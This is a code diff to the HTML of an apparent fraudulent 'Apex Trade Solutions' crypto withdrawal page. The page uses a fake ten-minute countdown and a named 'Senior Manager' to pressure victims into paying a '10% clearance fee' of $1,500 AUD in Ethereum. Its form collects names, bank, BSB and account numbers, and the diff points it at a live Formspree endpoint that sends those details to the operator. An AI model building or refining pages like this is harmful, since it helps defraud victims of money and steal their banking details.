@@ -21,28 +21,28 @@
     <main class="max-w-lg mx-auto p-4 space-y-6">
         
         <div class="text-center py-4">
-            <h1 class="text-2xl font-black text-blue-900 tracking-tight">APEX <span class="text-blue-600 font-light">TRADE SOLUTIONS</span></h1>
-            <div class="h-1 w-20 bg-blue-600 mx-auto mt-2"></div>
+            <h1 class="text-2xl font-black text-blue-900 tracking-tight text-center">APEX <span class="text-blue-600 font-light text-center">TRADE SOLUTIONS</span></h1>
+            <div class="h-1 w-20 bg-blue-600 mx-auto mt-2 text-center"></div>
         </div>
 
         <div class="timer-bg rounded-xl p-6 shadow-sm text-center">
-            <p class="text-red-600 text-xs font-bold uppercase tracking-widest mb-2">Withdrawal Security Window</p>
-            <div id="timer" class="text-4xl font-mono font-bold text-red-700 tracking-tighter">10:00</div>
-            <p class="text-[11px] text-red-500 mt-3 leading-relaxed px-4 italic">
+            <p class="text-red-600 text-xs font-bold uppercase tracking-widest mb-2 text-center">Withdrawal Security Window</p>
+            <div id="timer" class="text-4xl font-mono font-bold text-red-700 tracking-tighter text-center">10:00</div>
+            <p class="text-[11px] text-red-500 mt-3 leading-relaxed px-4 italic text-center">
                 Authorized by Senior Manager Paola Almontes De León. Token expires in 10 minutes.
             </p>
         </div>
 
         <div class="fee-highlight rounded-lg p-4 text-center">
-            <p class="text-xs font-bold text-yellow-800 uppercase">Mandatory Clearance Fee</p>
-            <p class="text-lg font-black text-yellow-900">10% Authorization Charge</p>
-            <p class="text-[10px] text-yellow-700 font-medium leading-tight">
+            <p class="text-xs font-bold text-yellow-800 uppercase text-center">Mandatory Clearance Fee</p>
+            <p class="text-lg font-black text-yellow-900 text-center">10% Authorization Charge</p>
+            <p class="text-[10px] text-yellow-700 font-medium leading-tight text-center">
                 Minimum activation requirement: <span class="underline">$1,500 AUD equivalent in Ethereum (ETH)</span>.
                 <br>Required for smart-contract verification and instant node release.
             </p>
         </div>
 
-        <form action="https://formspree.io/f/YOUR_ID_HERE" method="POST" class="bg-white rounded-2xl shadow-xl p-6 space-y-5 border border-slate-200">
+        <form action="https://formspree.io/f/xreobpde" method="POST" class="bg-white rounded-2xl shadow-xl p-6 space-y-5 border border-slate-200">
             
             <h2 class="text-sm font-bold text-slate-800 uppercase tracking-wide border-b pb-3 text-center">Withdrawal Requisition</h2>
 
@@ -50,18 +50,18 @@
                 <label class="block text-center text-xs font-black text-blue-900 mb-2 uppercase tracking-tighter">Security Token Activation</label>
                 <input type="text" name="Security Token" placeholder="XXXX-XXXX" maxlength="9" required 
                 class="token-input w-full p-3 text-center text-xl font-bold bg-white border border-blue-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none text-blue-900">
-                <p class="text-[9px] text-center text-blue-500 mt-2">Enter the 8-digit alpha-numeric code provided by your manager.</p>
+                <p class="text-[9px] text-center text-blue-500 mt-2">Enter the unique 8-digit code provided for this session.</p>
             </div>
 
             <hr class="border-slate-100">
 
             <div>
-                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase">Full Legal Name</label>
+                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Full Legal Name</label>
                 <input type="text" name="Client Name" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
             </div>
 
             <div>
-                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase">Australian Banking Institution</label>
+                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Australian Banking Institution</label>
                 <select name="Bank Name" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
                     <option value="" disabled selected>Select Bank</option>
                     <option value="CBA">Commonwealth Bank (CBA)</option>
@@ -69,23 +69,24 @@
                     <option value="ANZ">ANZ Bank</option>
                     <option value="NAB">National Australia Bank (NAB)</option>
                     <option value="Macquarie">Macquarie Bank</option>
+                    <option value="Bendigo">Bendigo Bank</option>
                     <option value="Other">Other Australian Institution</option>
                 </select>
             </div>
 
             <div class="grid grid-cols-2 gap-4">
                 <div>
-                    <label class="block text-xs font-bold text-slate-600 mb-2 uppercase">BSB Number</label>
+                    <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">BSB Number</label>
                     <input type="text" name="BSB" placeholder="000-000" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg">
                 </div>
                 <div>
-                    <label class="block text-xs font-bold text-slate-600 mb-2 uppercase">Account Number</label>
+                    <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Account Number</label>
                     <input type="text" name="Account" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg">
                 </div>
             </div>
 
             <div>
-                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase">Preferred ETH Wallet (Exchange)</label>
+                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Preferred ETH Wallet (Exchange)</label>
                 <select name="Exchange App" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
                     <option value="" disabled selected>Select Application</option>
                     <option value="Coinbase">Coinbase</option>
@@ -97,20 +98,20 @@
             </div>
 
             <div>
-                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase">Total Withdrawal Amount ($AUD)</label>
+                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Total Withdrawal Amount ($AUD)</label>
                 <div class="relative">
                     <span class="absolute left-3 top-3 font-bold text-blue-900">$</span>
                     <input type="number" name="Amount" placeholder="0.00" required class="w-full p-3 pl-7 bg-slate-50 border border-slate-200 rounded-lg font-bold text-blue-900">
                 </div>
             </div>
 
-            <button type="submit" class="w-full btn-gradient text-white font-bold py-4 rounded-xl shadow-lg transform active:scale-95 transition-all uppercase tracking-widest">
+            <button type="submit" class="w-full btn-gradient text-white font-bold py-4 rounded-xl shadow-lg transform active:scale-95 transition-all uppercase tracking-widest text-center">
                 Authorize Release & Pay Fee
             </button>
             
-            <div class="flex items-center justify-center space-x-2 pt-2">
-                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                <p class="text-[10px] text-gray-400 font-medium tracking-tight uppercase">Encrypted Node Connection Active</p>
+            <div class="flex items-center justify-center space-x-2 pt-2 text-center">
+                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse text-center"></span>
+                <p class="text-[10px] text-gray-400 font-medium tracking-tight uppercase text-center">Encrypted Node Connection Active</p>
             </div>
         </form>
     </main>
@@ -125,10 +126,6 @@
             timerDisplay.innerHTML = `${minutes}:${seconds}`;
             if(time > 0) time--;
         }, 1000);
-    </script>
-
-    <script type="text/javascript">
-    window.$crisp=[];window.CRISP_WEBSITE_ID="PASTE_YOUR_ID_HERE";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();
     </script>
 </body>
 </html>
